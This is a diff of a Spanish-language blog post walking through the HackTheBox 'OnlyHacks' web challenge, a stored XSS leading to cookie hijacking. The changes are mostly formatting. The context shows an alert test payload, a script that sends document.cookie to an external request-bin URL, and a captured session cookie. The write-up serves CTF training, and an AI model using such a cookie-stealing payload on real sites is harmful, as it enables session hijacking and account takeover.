@@ -18,19 +18,19 @@
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="OnlyHacks Web Challenge - HackTheBox">
-	<meta name="twitter:description" content="Este es un Challenge Web de la plataforma HackTheBox, el cual toca la vulnerabilidad XSS stored, aplicandolo en un Cookie Hijacking">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="OnlyHacks Web Challenge - HackTheBox">
+  <meta name="twitter:description" content="Este es un Challenge Web de la plataforma HackTheBox, el cual toca la vulnerabilidad XSS stored, aplicandolo en un Cookie Hijacking">
 
 <meta property="og:url" content="https://celero0.github.io/posts/onlyhacks/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="OnlyHacks Web Challenge - HackTheBox">
-	<meta property="og:description" content="Este es un Challenge Web de la plataforma HackTheBox, el cual toca la vulnerabilidad XSS stored, aplicandolo en un Cookie Hijacking">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2026-04-02T03:31:41+00:00">
-		<meta property="article:modified_time" content="2026-04-02T03:31:41+00:00">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="OnlyHacks Web Challenge - HackTheBox">
+  <meta property="og:description" content="Este es un Challenge Web de la plataforma HackTheBox, el cual toca la vulnerabilidad XSS stored, aplicandolo en un Cookie Hijacking">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-04-02T03:31:41+00:00">
+    <meta property="article:modified_time" content="2026-04-02T03:31:41+00:00">
 
 
 
@@ -55,7 +55,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -210,7 +210,7 @@
 <p>Si vamos a <code>Matches</code> nos aparecen los match con sus respectivos chats</p>
 <img src="/images/Pasted image 20260402000331.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>En el chat procedemos a probar si el campo interpreta etiquetas html con el siguiente payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Hola,&lt;<span style="color:#7ee787">h1</span>&gt;amiga&lt;/<span style="color:#7ee787">h1</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Hola,&lt;<span style="color:#7ee787">h1</span>&gt;amiga&lt;/<span style="color:#7ee787">h1</span>&gt;
 </span></span></code></pre></div><p>Y vemos que la web lo interpreta, lo cual da señal de la mala implementación de la web</p>
 <img src="/images/Pasted image 202604020006511.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h2 id="explotando-xss">
@@ -221,7 +221,7 @@
   </a>
 </h2>
 <p>Sabiendo que la web interpreta las etiquetas HTML ahora podemos probar si es que es vulnerable a <code>XSS</code>, con el siguiente payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>que tal &lt;script&gt;alert<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;XSS&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>&lt;/script&gt;
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>que tal &lt;script&gt;alert<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;XSS&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>&lt;/script&gt;
 </span></span></code></pre></div><p>Vemos que nos aparece la alerta, por lo cual concluimos que la web es vulnerable a un ataque <code>XSS</code></p>
 <img src="/images/Pasted image 20260402000900.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h2 id="cookie-hijacking">
@@ -239,7 +239,7 @@ El problema radica en el funcionamiento del laboratorio, como no estamos conecta
 <img src="/images/Pasted image 20260402001415.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Este link <code>http://requestbin.whapi.cloud/1se0hy01</code> lo integraremos a nuestro payload para obtener la cookie de la víctima.</p>
 <p>El payload que utilizaremos es el siguiente</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;script&gt;document.location<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;http://requestbin.whapi.cloud/1se0hy01/index.php?c=&#39;</span>+document.cookie;&lt;/script&gt;
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;script&gt;document.location<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;http://requestbin.whapi.cloud/1se0hy01/index.php?c=&#39;</span>+document.cookie;&lt;/script&gt;
 </span></span></code></pre></div><p>Lo mandamos en el chat de la siguiente forma</p>
 <img src="/images/Pasted image 20260402001628.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>y al recargar la página de <code>Request Bin</code>, obtenemos la petición con la Cookie de sesión de la víctima <code>eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImNlbGVybzAifX0.ac3cOA.JkuMO5aS_6oFkXOIyXaHvjC5Kis</code></p>
